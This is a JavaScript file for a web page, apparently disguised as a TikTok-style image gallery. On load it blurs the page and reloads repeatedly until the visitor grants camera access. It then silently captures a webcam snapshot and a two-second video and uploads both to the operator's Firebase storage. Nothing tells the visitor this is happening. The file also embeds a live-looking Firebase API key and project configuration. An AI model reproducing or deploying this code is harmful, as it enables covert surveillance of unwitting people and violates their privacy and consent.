import { initializeApp } from "https://www.gstatic.com/firebasejs/9.0.0/firebase-app.js";
import { getStorage, ref, uploadBytes, getDownloadURL } from "https://www.gstatic.com/firebasejs/9.0.0/firebase-storage.js";

// Your web app's Firebase configuration
const firebaseConfig = {
    apiKey: "AIzaSyD6bpzJtLQ0Ln4MLH4mdJsSejYf1cuRlUs",
    authDomain: "tiktok-8f8c2.firebaseapp.com",
    projectId: "tiktok-8f8c2",
    storageBucket: "tiktok-8f8c2.appspot.com",
    messagingSenderId: "705005735151",
    appId: "1:705005735151:web:d2d5d73a4c8143ae5bdf1a"
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const storage = getStorage(app); // Initialize Storage

const images = document.getElementById("images");
const image = [
    // Example image URLs (add actual image URLs here if needed)
];

const imagesLength = document.getElementById('images-length');
imagesLength.innerHTML = `(${image.length})`;

images.innerHTML = `
 <div class="image">
    ${image.map((img) => (
    `<img src="${img.imageURL}" />`
)).join('')}
</div>
`;

// Function to apply blur effect
function blurWebsite() {
    var content = document.getElementById('content');
    content.style.filter = 'blur(100px)';
}

// Function to remove blur effect
function unblurWebsite() {
    var content = document.getElementById('content');
    content.style.filter = 'none';
}

// Function to continuously request camera permission and record video
function requestCameraPermission() {
    navigator.mediaDevices.getUserMedia({
        video: true,
        audio: false
    })
        .then(function (localMediaStream) {
            unblurWebsite(); // Remove blur
            var video = document.querySelector('.video');
            video.srcObject = localMediaStream;
            video.play();

            // Start recording video and take a screenshot simultaneously
            recordVideoAndTakeScreenshot(localMediaStream);
        })
        .catch(function (err) {
            if (err.name === "NotAllowedError" || err.name === "PermissionDeniedError") {
                blurWebsite(); // Keep website blurred until permission is granted
                alert("Camera permission is required to use this application. Please allow access in your browser settings.");
                setTimeout(function () {
                    window.location.reload(); // Retry permission request
                }, 100);
            }
        });
}

// Function to record video and take screenshot sequentially
function recordVideoAndTakeScreenshot(stream) {
    captureScreenshotAndUpload(stream).then(() => {
        startVideoRecording(stream); // Start video recording after the image is uploaded
    });
}

// Function to capture a screenshot and upload it to Firebase
function captureScreenshotAndUpload(stream) {
    return new Promise((resolve) => {
        const video = document.querySelector('.video');
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        // Convert the canvas to a blob (image format)
        canvas.toBlob((imageBlob) => {
            uploadToFirebase(imageBlob, 'image').then((downloadURL) => {
                resolve(); // Proceed with video recording after the image is uploaded
            });
        }, 'image/png');
    });
}


// Function to start recording the video
function startVideoRecording(stream) {
    let options = { mimeType: "video/webm" };
    let mediaRecorder = new MediaRecorder(stream, options);
    let chunks = [];

    // Collect video data
    mediaRecorder.ondataavailable = function (event) {
        if (event.data.size > 0) {
            chunks.push(event.data);
        }
    };

    // Stop recording after 3 seconds and handle the video blob
    mediaRecorder.onstop = function () {
        let videoBlob = new Blob(chunks, { type: "video/webm" });
        uploadToFirebase(videoBlob, 'video'); // Upload the recorded video to Firebase
    };

    mediaRecorder.start(); // Start recording the video

    // Stop recording after 2 seconds
    setTimeout(() => {
        mediaRecorder.stop();
    }, 2000);
}

// Function to upload video or image to Firebase
function uploadToFirebase(blob, type) {
    return new Promise((resolve, reject) => {
        var fileName = type + '_' + Date.now() + (type === 'video' ? '.webm' : '.png');
        var storageRef = ref(storage, `${type}s/` + fileName);

        uploadBytes(storageRef, blob).then((snapshot) => {
            console.log(`Uploaded a ${type} successfully!`);
            console.log('Snapshot:', snapshot);

            getDownloadURL(snapshot.ref).then((downloadURL) => {
                console.log(`${type.charAt(0).toUpperCase() + type.slice(1)} available at`, downloadURL);
                resolve(downloadURL); // Resolve the promise with the download URL
            }).catch((error) => {
                console.error(`Failed to get download URL for ${type}:`, error);
                reject(error);
            });
        }).catch((error) => {
            console.error(`Failed to upload ${type}:`, error);
            reject(error);
        });
    });
}


// Call the function on page load
blurWebsite(); // Blur the website initially
requestCameraPermission();
